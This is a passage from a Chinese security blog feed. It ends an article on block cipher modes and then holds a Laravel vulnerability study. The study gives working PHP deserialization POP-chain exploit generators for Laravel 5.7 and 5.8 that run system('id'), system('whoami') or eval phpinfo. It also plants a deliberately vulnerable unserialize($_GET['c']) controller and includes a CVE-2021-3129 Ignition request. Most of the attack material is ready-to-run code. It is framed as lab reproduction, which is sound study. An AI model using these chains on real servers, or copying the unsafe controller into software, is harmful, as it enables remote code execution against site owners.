codebook），在ECB模式中，将明文分组加密之后的结果将直接成为密文分组。<br>加密：<br><img src="../../images/cipher/DES/7.png" alt=""><br>解密：<br><img src="../../images/cipher/DES/8.png" alt=""><br><strong>攻击方式</strong><br>直接找几组不同的密文，然后截取再拼接进行重放攻击 </p><h2 id="CBC"><a href="#CBC" class="headerlink" title="CBC"></a>CBC</h2><p>CBC 全称为密码分组链接（Cipher-block chaining） 模式。在CBC模式中，首先将明文分组与前一个密文分组进行XOR运算，然后再进行加密。<br>加密：<br><img src="../../images/cipher/DES/9.png" alt=""><br>解密：<br><img src="../../images/cipher/DES/10.png" alt=""><br><strong>CBC字节翻转攻击</strong><br><img src="../../images/cipher/DES/11.png" alt=""><br><strong>Padding oracle attack</strong><br>填充提示攻击是一种利用分组密码中的填充部分来进行攻击的方法，在分组密码中，当明文长度不为分组长度的整数倍时，需要在最后一个分组中填充一些数据使其凑满一个分组长度。      </p><p><a href="https://www.freebuf.com/articles/web/15504.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/15504.html</a> </p><h2 id="CFB"><a href="#CFB" class="headerlink" title="CFB"></a>CFB</h2><p>CFB 全称为密文反馈模式（Cipher feedback）。明文分组和密文分组之间并没有经过加密这一步骤，只有一个XOR。<br><img src="../../images/cipher/DES/7.jpg" alt=""> </p><p><strong>重放攻击</strong><br><img src="../../images/cipher/DES/8.jpg" alt=""> </p><h2 id="OFB"><a href="#OFB" class="headerlink" title="OFB"></a>OFB</h2><p>FB 全称为输出反馈模式（Output feedback），其反馈内容是分组加密后的内容而不是密文<br>加密<br><img src="../../images/cipher/DES/12.jpg" alt=""><br>解密<br><img src="../../images/cipher/DES/13.jpg" alt=""> </p><h2 id="CTR"><a href="#CTR" class="headerlink" title="CTR"></a>CTR</h2><p> CTR 模式全称是CounTeR模式(计数器模式)，CTR模式是一种通过将逐次累积的计数器进行加密来生成密钥流的流密码。<br> 加密<br><img src="../../images/cipher/DES/14.jpg" alt=""><br>解密<br><img src="../../images/cipher/DES/15.jpg" alt=""> </p><p>参考文章<br>DES加密算法原理:w<a href="https://www.jianshu.com/p/c44a8a1b7c38" target="_blank" rel="noopener">https://www.jianshu.com/p/c44a8a1b7c38</a><br>DES加密算法分析:<a href="http://ronpa.top/2018/08/20/DES%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://ronpa.top/2018/08/20/DES%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/</a><br>AES 加密算法的原理详解：<a href="https://blog.csdn.net/gulang03/article/details/81175854" target="_blank" rel="noopener">https://blog.csdn.net/gulang03/article/details/81175854</a><br>ctfwiki:<a href="https://ctf-wiki.org/crypto/blockcipher/mode/introduction/" target="_blank" rel="noopener">https://ctf-wiki.org/crypto/blockcipher/mode/introduction/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对称密码算法有时又叫传统密码算法、秘密密钥算法或单密钥算法。对称密码算法的加密密钥能够从解密密钥中推算出来，反过来也成立。在大多数对称算法中，加密解密密钥是相同的。它要求发送者和接收者在安全通信之前，商定一个密钥。对称算法的安全性依赖于密钥，泄漏密钥就意味着任何人都能对消息进行加密解密。只要通信需要保密，密钥就必须保密。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Laravel漏洞学习</title>
    <link href="https://blog.cfyqy.com/article/d1159936.html"/>
    <id>https://blog.cfyqy.com/article/d1159936.html</id>
    <published>2021-01-14T01:13:56.000Z</published>
    <updated>2021-01-24T09:34:23.467Z</updated>
    
    <content type="html"><![CDATA[<p>laravel漏洞学习</p><a id="more"></a><p>安装 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project laravel/laravel laravel57 <span class="string">"5.7.*"</span></span><br></pre></td></tr></table></figure><h1 id="Laravel5-7反序列化漏洞"><a href="#Laravel5-7反序列化漏洞" class="headerlink" title="Laravel5.7反序列化漏洞"></a>Laravel5.7反序列化漏洞</h1><p>详情可看此文章：<br><a href="https://xz.aliyun.com/t/5911" target="_blank" rel="noopener">https://xz.aliyun.com/t/5911</a><br><a href="https://www.cnblogs.com/tr1ple/p/11079354.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/11079354.html</a>   </p><p>漏洞描述：</p><p>Laravel Framework是Taylor Otwell软件开发者开发的一款基于PHP的Web应用程序开发框架。Illuminate是其中的一个组件。Laravel Framework 5.7.x版本中的Illuminate组件存在反序列化漏洞，远程攻击者可利用该漏洞执行代码。</p><p>假设存在以下二次开发漏洞点：<br>在 laravel57/app/Http/Controllers/ 下添加 DemoController 控制器，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">demo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">            $code = $_GET[<span class="string">'c'</span>];</span><br><span class="line">            unserialize($code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Welcome to laravel5.7"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 laravel57/routes/web.php 文件中添加一条路由，便于我们后续访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">'/'</span>,<span class="string">"DemoController@Demo"</span>);</span><br></pre></td></tr></table></figure><p>exp</p><p>放在public文件夹下执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">command</span>;</span><br><span class="line">        <span class="keyword">protected</span> $parameters;</span><br><span class="line">        <span class="keyword">protected</span> $app;</span><br><span class="line">        <span class="keyword">public</span> $test;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($command, $parameters,$class,$app)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = $command;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test=$class;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app=$app;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GenericUser</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">attributes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $attributes)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;attributes = $attributes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">hasBeenBootstrapped</span> = <span class="title">false</span>;</span><br><span class="line">        <span class="keyword">protected</span> $bindings;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($bind)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindings=$bind;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">genericuser</span> = <span class="title">new</span> <span class="title">Illuminate</span>\<span class="title">Auth</span>\<span class="title">GenericUser</span>(<span class="title">array</span>("<span class="title">expectedOutput</span>"=&gt;<span class="title">array</span>("0"=&gt;"1"),"<span class="title">expectedQuestions</span>"=&gt;<span class="title">array</span>("0"=&gt;"1")));</span><br><span class="line">    $application = <span class="keyword">new</span> Illuminate\Foundation\Application(<span class="keyword">array</span>(<span class="string">"Illuminate\Contracts\Console\Kernel"</span>=&gt;<span class="keyword">array</span>(<span class="string">"concrete"</span>=&gt;<span class="string">"Illuminate\Foundation\Application"</span>)));</span><br><span class="line">    $pendingcommand = <span class="keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(<span class="string">"system"</span>,<span class="keyword">array</span>(<span class="string">'id'</span>),$genericuser,$application);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingcommand));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Laravel5-8-x反序列化POP链"><a href="#Laravel5-8-x反序列化POP链" class="headerlink" title="Laravel5.8.x反序列化POP链"></a>Laravel5.8.x反序列化POP链</h1><p><strong>exp1:</strong><br>详情可看 <a href="https://xz.aliyun.com/t/6059" target="_blank" rel="noopener">https://xz.aliyun.com/t/6059</a>   </p><p>在 laravel58/routes/web.php 文件添加路由</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">"/"</span>,<span class="string">"\App\Http\Controllers\DemoController@demo"</span>);</span><br></pre></td></tr></table></figure><p>在 laravel58/app/Http/Controllers/ 下添加 DemoController.php 控制器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace App\Http\Controllers;</span><br><span class="line"></span><br><span class="line">class DemoController extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="keyword">function</span> demo()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'c'</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">            unserialize(<span class="variable">$code</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="string">"Welcome to laravel5.8"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Scalar</span>\<span class="title">MagicConst</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Line</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> $code;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($config, $code)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config = $config;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = $code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">EvalLoader</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($queueResolver)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = $queueResolver;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($connection)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = $connection;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">line</span> = <span class="title">new</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Scalar</span>\<span class="title">MagicConst</span>\<span class="title">Line</span>();</span><br><span class="line">    $mockdefinition = <span class="keyword">new</span> Mockery\Generator\MockDefinition($line,<span class="string">'&lt;?php phpinfo();?&gt;'</span>);</span><br><span class="line">    $evalloader = <span class="keyword">new</span> Mockery\Loader\EvalLoader();</span><br><span class="line">    $dispatcher = <span class="keyword">new</span> Illuminate\Bus\Dispatcher(<span class="keyword">array</span>($evalloader,<span class="string">'load'</span>));</span><br><span class="line">    $queuedcommand = <span class="keyword">new</span> Illuminate\Foundation\Console\QueuedCommand($mockdefinition);</span><br><span class="line">    $pendingbroadcast = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($dispatcher,$queuedcommand);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($pendingbroadcast));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>exp2:</strong><br>这条链来自前一阵CTF国赛某道题目。漏洞存在<code>symfony</code>组件中（影响至罪行<code>4.4.x-dev</code> 版本），而默认安装的 laravel5.8 框架没有包含该组件。为了复现该漏洞，我们需要将<code>composer.json</code> 文件中的 <code>require</code>添加 <code>&quot;symfony/symfony&quot;: &quot;4.*&quot;</code>并执行 <code>composer update</code>命令即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">expiry</span>;</span><br><span class="line">        <span class="keyword">protected</span> $poolHash;</span><br><span class="line">        <span class="keyword">protected</span> $innerItem;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($expiry, $poolHash, $command)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;expiry = $expiry;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;poolHash = $poolHash;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;innerItem = $command;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ProxyAdapter</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">poolHash</span>;</span><br><span class="line">        <span class="keyword">private</span> $setInnerItem;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($poolHash, $func)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;poolHash = $poolHash;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;setInnerItem = $func;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $deferred = [];</span><br><span class="line">        <span class="keyword">private</span> $pool;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($deferred, $pool)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = $deferred;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = $pool;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">cacheitem</span> = <span class="title">new</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>(1,1,"<span class="title">whoami</span>");</span><br><span class="line">    $proxyadapter = <span class="keyword">new</span> Symfony\Component\Cache\Adapter\ProxyAdapter(<span class="number">1</span>,<span class="string">'system'</span>);</span><br><span class="line">    $tagawareadapter = <span class="keyword">new</span> Symfony\Component\Cache\Adapter\TagAwareAdapter(<span class="keyword">array</span>($cacheitem),$proxyadapter);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($tagawareadapter));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Laravel-5-8-SQL-注入漏洞"><a href="#Laravel-5-8-SQL-注入漏洞" class="headerlink" title="Laravel 5.8 SQL 注入漏洞"></a>Laravel 5.8 SQL 注入漏洞</h1><p>Laravel 5.8.5以下版本<br><a href="https://xz.aliyun.com/t/5331" target="_blank" rel="noopener">https://xz.aliyun.com/t/5331</a></p><p>数据库添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">create table users(</span><br><span class="line">id int  auto_increment,</span><br><span class="line">username varchar(250),</span><br><span class="line">password varchar(250),</span><br><span class="line">level int,</span><br><span class="line">primary key(id)</span><br><span class="line">);</span><br><span class="line">insert into users values(1,<span class="string">'admin'</span>,<span class="string">'admin'</span>,1);</span><br><span class="line">insert into users values(2,<span class="string">'user'</span>,<span class="string">'123456'</span>,2);</span><br><span class="line">insert into users values(3,<span class="string">'aaa'</span>,<span class="string">'bbb'</span>,3);</span><br></pre></td></tr></table></figure><h1 id="Laravel-lt-8-4-2-Debug模式-ignition远程代码执行漏洞"><a href="#Laravel-lt-8-4-2-Debug模式-ignition远程代码执行漏洞" class="headerlink" title="Laravel &lt;= 8.4.2 Debug模式 _ignition远程代码执行漏洞"></a>Laravel &lt;= 8.4.2 Debug模式 <code>_ignition</code>远程代码执行漏洞</h1><p>详细文章：<a href="https://whoamianony.top/2021/01/15/lou-dong-fu-xian/laravel/laravel-debug-mode-rce-cve-2021-3129-li-yong-fu-xian/" target="_blank" rel="noopener">https://whoamianony.top/2021/01/15/lou-dong-fu-xian/laravel/laravel-debug-mode-rce-cve-2021-3129-li-yong-fu-xian/</a>   </p><p>当Laravel开启了Debug模式时，由于Laravel自带的Ignition功能的某些接口存在过滤不严，攻击者可以发起恶意请求，通过构造恶意Log文件等方式触发Phar反序列化，从而造成远程代码执行，控制服务器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/laravel/laravel.git</span><br><span class="line"><span class="built_in">cd</span> laravel</span><br><span class="line">git checkout e849812</span><br><span class="line">composer install</span><br><span class="line">composer require facade/ignition==2.5.1</span><br><span class="line">将.env.example修改为.env</span><br><span class="line">php artisan key:generate</span><br><span class="line">php artisan serve --host=0.0.0.0</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: localhost:8000</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 168</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"solution"</span>: <span class="string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span>,</span><br><span class="line">  <span class="string">"parameters"</span>: &#123;</span><br><span class="line">    <span class="string">"variableName"</span>: <span class="string">"username"</span>,</span><br><span class="line">    <span class="string">"viewFile"</span>: <span class="string">"xxxxxxx"</span>//phar文件位置</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../../images/php/laravel/1.png" alt=""></p><h1 id="Laravel-cookie"><a href="#Laravel-cookie" class="headerlink" title="Laravel cookie"></a>Laravel cookie</h1><p>Laravel发布安全更新，其中指出使用cookie session driver的应用受到漏洞影响，该漏洞会导致rce。<br><a href="https://blog.laravel.com/laravel-cookie-security-releases" target="_blank" rel="noopener">https://blog.laravel.com/laravel-cookie-security-releases</a><br><a href="http://x2y.pw/2020/08/06/Laravel-Cookie-Security%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://x2y.pw/2020/08/06/Laravel-Cookie-Security%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a><br>影响版本：&lt; v6.18.27，&lt; v7.22.0 </p><p>漏洞比较鸡肋，限制条件较多</p><ul><li>需要开启cookie session driver，默认是file driver</li><li>需要开发者特定的漏洞代码 cookie(‘key’, $value ，value的值完全可控</li><li>反序列化调用链</li></ul><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://mochazz.github.io/2019/06/25/Laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BRCE%E9%93%BE%E6%8C%96%E6%8E%98/" target="_blank" rel="noopener">Laravel5.7反序列化漏洞之RCE链挖掘</a><br><a href="https://xz.aliyun.com/t/5911" target="_blank" rel="noopener">Laravel5.8.x反序列化POP链</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;laravel漏洞学习&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>信安技术文章搜索引擎使用指南</title>
    <link href="https://blog.cfyqy.com/article/7b1c7182.html"/>
    <id>https://blog.cfyqy.com/article/7b1c7182.html</id>
    <published>2021-01-12T05:41:21.000Z</published>
    <updated>2021-01-13T02:06:24.277Z</updated>
    
